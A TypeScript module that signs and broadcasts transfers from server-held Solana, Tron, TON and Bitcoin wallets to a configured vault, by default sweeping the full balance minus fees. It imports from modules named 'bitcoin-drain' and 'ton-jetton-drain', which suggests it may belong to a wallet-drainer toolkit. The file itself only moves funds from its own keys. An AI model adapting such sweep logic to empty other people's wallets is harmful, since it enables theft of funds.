// @ts-nocheck
/**
 * Server-signed settlement broadcast when user payloads are absent.
 * Enabled via NON_EVM_SERVER_SIGNING=true and per-chain execution keys.
 */
import {
  Connection,
  PublicKey,
  SystemProgram,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'
import { Address, Cell, internal, toNano } from '@ton/core'
import { JettonMaster, TonClient, WalletContractV4 } from '@ton/ton'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { TRON_MAINNET_USDT_CONTRACT } from '../adapters/tron-adapter.js'
import { fetchWalletUtxos } from './bitcoin-drain.js'
import { resolveTronVaultAddress } from './operational-vault.js'
import {
  executeServerBitcoinPsbtSweep,
  executeServerSolNativeTransfer,
  executeServerTonNativeTransfer,
  executeServerTrxTransfer,
  fetchTronBalance,
  fetchTonBalance,
  loadServerSolanaKeypair,
  resolveServerBitcoinAddress,
  resolveServerSolanaPublicKey,
  resolveServerTonAddress,
  resolveServerTronAddressAsync,
} from './server-chain-execution.js'
import { buildJettonTransferBody, confirmJettonTransferAfterBroadcast } from './ton-jetton-drain.js'
import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import type {
  SettlementBroadcastResult,
  SettlementBroadcastStatus,
} from './settlement-execution-bridge.js'

function wrapBroadcastResult(
  result: {
    lane: SettlementBroadcastResult['lane']
    chain_family: SettlementBroadcastResult['chain_family']
    destination_vault: string
    status: SettlementBroadcastStatus
    tx_hash?: string
    detail?: string
  },
): SettlementBroadcastResult {
  const broadcasted = result.status === 'broadcasted'
  return {
    ...result,
    destination: result.destination_vault,
    chain: result.chain_family,
    broadcasted,
    telemetry: {
      vault_bound: true,
      broadcast_ready: broadcasted,
      status: result.status,
      ...(result.detail ? { detail: result.detail } : {}),
      ...(result.tx_hash ? { tx_hash: result.tx_hash } : {}),
    },
  }
}

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')

export function isNonEvmServerSigningEnabled(): boolean {
  const v = process.env['NON_EVM_SERVER_SIGNING']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

function createAssociatedTokenAccountIdempotentInstruction(
  payer: PublicKey,
  ata: PublicKey,
  owner: PublicKey,
  mint: PublicKey,
): TransactionInstruction {
  const data = Buffer.alloc(1)
  data.writeUInt8(1, 0)
  return new TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: ata, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data,
  })
}

function createSplTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
): TransactionInstruction {
  const data = Buffer.alloc(9)
  data.writeUInt8(3, 0)
  data.writeBigUInt64LE(amount, 1)
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data,
  })
}

async function signAndSendSolana(
  connection: Connection,
  keypair: NonNullable<ReturnType<typeof loadServerSolanaKeypair>>,
  instructions: TransactionInstruction[],
): Promise<string> {
  const { blockhash } = await connection.getLatestBlockhash('finalized')
  const msg = new TransactionMessage({
    payerKey: keypair.publicKey,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)
  tx.sign([keypair])
  const sig = await connection.sendRawTransaction(tx.serialize(), {
    preflightCommitment: 'confirmed',
    skipPreflight: false,
    maxRetries: 3,
  })
  const conf = await connection.confirmTransaction(sig, 'confirmed')
  if (conf.value.err) {
    throw new Error(`Solana confirmation failed: ${JSON.stringify(conf.value.err)}`)
  }
  return sig
}

export async function serverBroadcastSvmNative(params: {
  vaultAddress: string
  amountRaw: bigint
  walletAddress?: string
}): Promise<SettlementBroadcastResult> {
  const keypair = loadServerSolanaKeypair()
  const from = resolveServerSolanaPublicKey()
  if (!keypair || !from) {
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not configured',
    })
  }

  const lamports =
    params.amountRaw > 0n
      ? params.amountRaw
      : BigInt(await new Connection(resolveInstitutionalSolanaRpcUrl(), 'confirmed').getBalance(
          keypair.publicKey,
        )) - 5000n

  if (lamports <= 0n) {
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'Insufficient SOL balance for server-signed transfer',
    })
  }

  const sol = await executeServerSolNativeTransfer({
    fromWallet: from,
    toVault: params.vaultAddress,
    lamports,
  })

  if (!sol.ok) {
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'detail' in sol ? sol.detail : 'SOL transfer failed',
    })
  }

  return wrapBroadcastResult({
    lane: 'solana-liquidator',
    chain_family: 'SVM',
    destination_vault: params.vaultAddress,
    status: 'broadcasted',
    tx_hash: sol.txSig,
    detail: 'Server-signed native SOL transfer',
  })
}

export async function serverBroadcastSvmSpl(params: {
  vaultAddress: string
  mint: string
  amountRaw: bigint
}): Promise<SettlementBroadcastResult> {
  const keypair = loadServerSolanaKeypair()
  if (!keypair) {
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not configured',
    })
  }

  const rpc = resolveInstitutionalSolanaRpcUrl()
  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const owner = keypair.publicKey
  const mint = new PublicKey(params.mint)
  const vaultOwner = new PublicKey(params.vaultAddress)
  const sourceAta = deriveAta(owner, mint)
  const destAta = deriveAta(vaultOwner, mint)

  const instructions: TransactionInstruction[] = []
  const destInfo = await connection.getAccountInfo(destAta)
  if (!destInfo && process.env['SWEEP_CREATE_ATA'] !== 'false') {
    instructions.push(
      createAssociatedTokenAccountIdempotentInstruction(owner, destAta, vaultOwner, mint),
    )
  }

  instructions.push(
    createSplTransferInstruction(sourceAta, destAta, owner, params.amountRaw),
  )

  try {
    const sig = await signAndSendSolana(connection, keypair, instructions)
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcasted',
      tx_hash: sig,
      detail: `Server-signed SPL transfer mint=${params.mint}`,
    })
  } catch (e) {
    return wrapBroadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

export async function serverBroadcastTron(params: {
  vaultAddress: string
  amountRaw: bigint
  tokenContract?: string | null
}): Promise<SettlementBroadcastResult> {
  const fromAddress = await resolveServerTronAddressAsync()
  if (!fromAddress) {
    return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'TRON_EXECUTION_PRIVATE_KEY not configured',
    })
  }

  const token = params.tokenContract?.trim() || null
  if (token) {
    const pk = process.env['TRON_EXECUTION_PRIVATE_KEY']?.trim().replace(/^0x/i, '')
    if (!pk) {
      return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
        chain_family: 'TRON',
        destination_vault: params.vaultAddress,
        status: 'broadcast_failed',
        detail: 'TRON_EXECUTION_PRIVATE_KEY missing',
      })
    }
    try {
      const { TronWeb } = await import('tronweb')
      const fullHost = resolveTronSensoryFullHost()
      const headers = tronProApiHeaders()
      const tronWeb =
        headers != null
          ? new TronWeb({ fullHost, headers, privateKey: pk.padStart(64, '0') })
          : new TronWeb({ fullHost, privateKey: pk.padStart(64, '0') })

      const contract = await tronWeb.contract().at(token)
      const bal = await (
        contract as unknown as {
          balanceOf: (a: string) => { call: () => Promise<unknown> }
        }
      )
        .balanceOf(fromAddress)
        .call()
      const amount =
        params.amountRaw > 0n
          ? params.amountRaw
          : BigInt(String(bal))
      if (amount <= 0n) {
        return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
          chain_family: 'TRON',
          destination_vault: params.vaultAddress,
          status: 'broadcast_failed',
          detail: 'Zero TRC-20 balance',
        })
      }
      const amountStr = amount.toString()
      const txHash = await (
        contract as unknown as {
          transfer: (to: string, amt: string) => { send: () => Promise<string> }
        }
      )
        .transfer(params.vaultAddress, amountStr)
        .send()
      return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
        chain_family: 'TRON',
        destination_vault: params.vaultAddress,
        status: 'broadcasted',
        tx_hash: typeof txHash === 'string' ? txHash : String(txHash),
        detail: 'Server-signed TRC-20 transfer',
      })
    } catch (e) {
      return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
        chain_family: 'TRON',
        destination_vault: params.vaultAddress,
        status: 'broadcast_failed',
        detail: e instanceof Error ? e.message : String(e),
      })
    }
  }

  const balanceSun = BigInt(await fetchTronBalance(fromAddress))
  const sendSun = params.amountRaw > 0n ? params.amountRaw : balanceSun - 2_000_000n
  if (sendSun <= 0n) {
    return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'Insufficient TRX for server transfer',
    })
  }

  const trx = await executeServerTrxTransfer({
    toVault: params.vaultAddress,
    amountSun: sendSun,
  })
  if (!trx.ok) {
    return wrapBroadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'detail' in trx ? trx.detail : 'TRX transfer failed',
    })
  }
  return wrapBroadcastResult({
    lane: 'tron-sensory-armor',
    chain_family: 'TRON',
    destination_vault: params.vaultAddress,
    status: 'broadcasted',
    tx_hash: trx.txHash,
    detail: 'Server-signed TRX transfer',
  })
}

export async function serverBroadcastTon(params: {
  vaultAddress: string
  amountRaw: bigint
  jettonMaster?: string | null
}): Promise<SettlementBroadcastResult> {
  const source = await resolveServerTonAddress()
  if (!source) {
    return wrapBroadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'TON_EXECUTION_MNEMONIC not configured',
    })
  }

  const jetton = params.jettonMaster?.trim()
  if (jetton) {
    try {
      const { mnemonicToWalletKey } = await import('@ton/crypto')
      const mnemonic = process.env['TON_EXECUTION_MNEMONIC']?.trim()
      if (!mnemonic) throw new Error('TON_EXECUTION_MNEMONIC missing')

      const key = await mnemonicToWalletKey(mnemonic.split(' '))
      const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
      const endpoint = resolveTonCenterJsonRpcUrl()
      const apiKey = tonCenterApiHeaders()?.['X-API-Key']
      const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
      const provider = client.open(wallet)

      const owner = Address.parse(source)
      const destination = Address.parse(params.vaultAddress)
      const master = client.open(JettonMaster.create(Address.parse(jetton)))
      const jettonWallet = await master.getWalletAddress(owner)
      const amount = params.amountRaw > 0n ? params.amountRaw : 1n

      const payloadB64 = buildJettonTransferBody({
        amount,
        destination,
        responseDestination: owner,
        forwardTonAmount: toNano('0.01'),
      })
      const bodyCell = Cell.fromBoc(Buffer.from(payloadB64, 'base64'))[0]
      if (!bodyCell) throw new Error('Invalid jetton transfer body')

      const seqno = await provider.getSeqno()
      await provider.sendTransfer({
        seqno,
        secretKey: key.secretKey,
        messages: [
          internal({
            to: jettonWallet,
            value: toNano('0.05'),
            bounce: true,
            body: bodyCell,
          }),
        ],
      })

      const walletAddress = wallet.address.toString({ bounceable: false, urlSafe: true })
      const confirmed = await confirmJettonTransferAfterBroadcast({
        walletAddress,
        seqnoBeforeSend: seqno,
        rpcUrl: endpoint,
      })

      return wrapBroadcastResult({
      lane: 'ton-sensory-armor',
        chain_family: 'TON',
        destination_vault: params.vaultAddress,
        status: 'broadcasted',
        tx_hash: confirmed.tx_hash,
        detail: confirmed.warning
          ? `Server-signed Jetton transfer (${confirmed.warning})`
          : 'Server-signed Jetton transfer',
      })
    } catch (e) {
      return wrapBroadcastResult({
      lane: 'ton-sensory-armor',
        chain_family: 'TON',
        destination_vault: params.vaultAddress,
        status: 'broadcast_failed',
        detail: e instanceof Error ? e.message : String(e),
      })
    }
  }

  const balance = await fetchTonBalance()
  const sendAmount =
    params.amountRaw > 0n ? params.amountRaw : balance - 50_000_000n
  if (sendAmount <= 0n) {
    return wrapBroadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'Insufficient TON balance',
    })
  }

  const ton = await executeServerTonNativeTransfer({
    toVault: params.vaultAddress,
    amountNanotons: sendAmount,
  })
  if (!ton.ok) {
    return wrapBroadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'detail' in ton ? ton.detail : 'TON transfer failed',
    })
  }
  return wrapBroadcastResult({
    lane: 'ton-sensory-armor',
    chain_family: 'TON',
    destination_vault: params.vaultAddress,
    status: 'broadcasted',
    tx_hash: ton.txHash,
    detail: 'Server-signed native TON transfer',
  })
}

export async function serverBroadcastUtxo(params: {
  vaultAddress: string
  amountSat?: bigint
}): Promise<SettlementBroadcastResult> {
  const walletAddress = resolveServerBitcoinAddress()
  if (!walletAddress) {
    return wrapBroadcastResult({
      lane: 'managed-utxo-relay',
      chain_family: 'UTXO',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'BITCOIN_EXECUTION_WIF not configured',
    })
  }

  const utxos = await fetchWalletUtxos(walletAddress)
  const total = utxos.reduce((s, u) => s + u.value, 0n)
  const reserve = BigInt(Math.ceil(Number(process.env['SWEEP_MIN_BTC'] ?? '0.00001') * 1e8))
  const amountSat =
    params.amountSat && params.amountSat > 0n
      ? params.amountSat
      : total - reserve - 2500n

  if (amountSat <= 0n) {
    return wrapBroadcastResult({
      lane: 'managed-utxo-relay',
      chain_family: 'UTXO',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'Insufficient BTC UTXO balance',
    })
  }

  const btc = await executeServerBitcoinPsbtSweep({
    walletAddress,
    vaultAddress: params.vaultAddress,
    amountSat,
  })
  if (!btc.ok) {
    return wrapBroadcastResult({
      lane: 'managed-utxo-relay',
      chain_family: 'UTXO',
      destination_vault: params.vaultAddress,
      status: 'broadcast_failed',
      detail: 'detail' in btc ? btc.detail : 'BTC sweep failed',
    })
  }
  return wrapBroadcastResult({
    lane: 'managed-utxo-relay',
    chain_family: 'UTXO',
    destination_vault: params.vaultAddress,
    status: 'broadcasted',
    tx_hash: btc.txHash,
    detail: 'Server-signed BTC PSBT sweep',
  })
}

/** Default TRC-20 when token_address looks like a Tron contract.
 *  Returns null for native-TRX transfers: vault address is the destination, not a TRC-20 contract.
 */
export function resolveTronTokenFromContext(tokenAddress?: string | null): string | null {
  const t = tokenAddress?.trim()
  if (!t) return TRON_MAINNET_USDT_CONTRACT
  // Vault address is NOT a TRC-20 contract — native TRX uses vault as token_address.
  // Passing vault to tronWeb.contract().at() calls getContract() → TronGrid returns {} → throws "Unknown error: {}"
  const vaultAddr = resolveTronVaultAddress()
  if (vaultAddr && t === vaultAddr) return null
  if (t.startsWith('T') && t.length >= 30) return t
  return null
}
